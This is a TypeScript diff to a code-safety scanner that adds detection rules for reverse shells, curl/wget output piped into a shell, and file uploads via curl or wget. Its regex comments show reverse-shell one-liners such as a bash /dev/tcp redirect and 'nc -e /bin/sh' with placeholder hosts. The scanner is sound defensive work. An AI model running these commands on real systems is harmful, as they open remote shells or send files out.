@@ -88,6 +88,30 @@ const ENV_ACCESS_PATTERNS = [
   /\$\{?\w*(?:KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|API_KEY)\w*\}?/i,
 ];
 
+/** CODE-014 reverse shell patterns */
+const REVERSE_SHELL_PATTERNS = [
+  /\/dev\/tcp\/[\w.-]+\/\d+/, // bash -i >& /dev/tcp/host/port 0>&1
+  /\bnc(?:at)?\b[^\n]*\s-(?:e|c)\s+/, // nc -e /bin/sh host port
+  /\bncat\b[^\n]*\s--exec\b/, // ncat --exec /bin/sh host port
+  /\bsocket\.socket\s*\([^)]*\)[\s\S]*\.(?:connect|connect_ex)\s*\([^)]*\)[\s\S]*os\.dup2\s*\([^)]*\)[\s\S]*(?:subprocess\.(?:call|run|Popen)|os\.system)\s*\(/,
+  /\bphp\b[^\n]*\bfsockopen\s*\([^)]*\)[\s\S]*\b(?:exec|shell_exec|system|passthru)\s*\(/,
+  /\bperl\b[^\n]*\bSocket\b[\s\S]*\bconnect\s*\([^)]*\)[\s\S]*\bexec\s*\(/,
+];
+
+/** CODE-015 remote execution and exfiltration patterns */
+const REMOTE_PIPELINE_EXEC_PATTERNS = [
+  /\bcurl\b[^\n|]*https?:\/\/[^\s|]+[^\n]*\|\s*(?:sh|bash|zsh|ksh|ash)\b/i,
+  /\bwget\b[^\n|]*https?:\/\/[^\s|]+[^\n]*\|\s*(?:sh|bash|zsh|ksh|ash)\b/i,
+  /\bcurl\b[^\n|]*https?:\/\/[^\s|]+[^\n]*\|\s*(?:python|python3|node)\b/i,
+  /\bwget\b[^\n|]*https?:\/\/[^\s|]+[^\n]*\|\s*(?:python|python3|node)\b/i,
+];
+
+const DATA_EXFIL_PATTERNS = [
+  /\bcurl\b[^\n]*(?:-d|--data|--data-binary|--data-raw)\s+@(?:[^\s'"`]+|["'`][^"'`]+["'`])/i,
+  /\bcurl\b[^\n]*(?:-F|--form)\s+[^\s=]+=@(?:[^\s'"`]+|["'`][^"'`]+["'`])/i,
+  /\bwget\b[^\n]*--post-file(?:=|\s+)(?:[^\s'"`]+|["'`][^"'`]+["'`])/i,
+];
+
 /** Dynamic code generation */
 const DYNAMIC_CODE_PATTERNS = [
   /\bcompile\s*\(/,
@@ -97,7 +121,6 @@ const DYNAMIC_CODE_PATTERNS = [
   /\b__import__\s*\(/,
 ];
 
-/** CODE-013 provider credential patterns (precise matches) */
 const PROVIDER_CREDENTIAL_PATTERNS: Array<{ pattern: RegExp; title: string }> = [
   {
     pattern: /\bsk-ant-api03-[A-Za-z0-9_-]{20,}\b/,
@@ -254,6 +277,31 @@ export const codeSafetyChecks: CheckModule = {
           codeBlockCtx: cbCtx,
         });
 
+        // CODE-014: reverse shell patterns — always CRITICAL, no code block reduction
+        checkPatterns(results, line, REVERSE_SHELL_PATTERNS, {
+          id: 'CODE-014',
+          severity: 'CRITICAL',
+          title: 'Reverse shell pattern',
+          loc,
+          lineNum,
+          source,
+        });
+
+        // CODE-015: remote pipeline execution / data exfiltration — no code block reduction
+        const code015 = detectCode015(line);
+        if (code015) {
+          results.push({
+            id: 'CODE-015',
+            category: 'CODE',
+            severity: code015.severity,
+            title: code015.title,
+            message: `At ${loc}: ${line.trim().slice(0, 120)}`,
+            line: lineNum,
+            snippet: line.trim().slice(0, 120),
+            source,
+          });
+        }
+
         // CODE-013: API key/credential leakage — no code block reduction
         const credentialLeak = detectCredentialLeak(line);
         if (credentialLeak) {
@@ -351,6 +399,29 @@ function checkPatterns(
 interface CredentialLeakMatch {
   severity: Severity;
   title: string;
+}
+
+interface Code015Match {
+  severity: Severity;
+  title: string;
+}
+
+function detectCode015(line: string): Code015Match | null {
+  if (REMOTE_PIPELINE_EXEC_PATTERNS.some((pattern) => pattern.test(line))) {
+    return {
+      severity: 'CRITICAL',
+      title: 'Remote pipeline execution pattern',
+    };
+  }
+
+  if (DATA_EXFIL_PATTERNS.some((pattern) => pattern.test(line))) {
+    return {
+      severity: 'HIGH',
+      title: 'Data exfiltration pattern',
+    };
+  }
+
+  return null;
 }
 
 function detectCredentialLeak(line: string): CredentialLeakMatch | null {
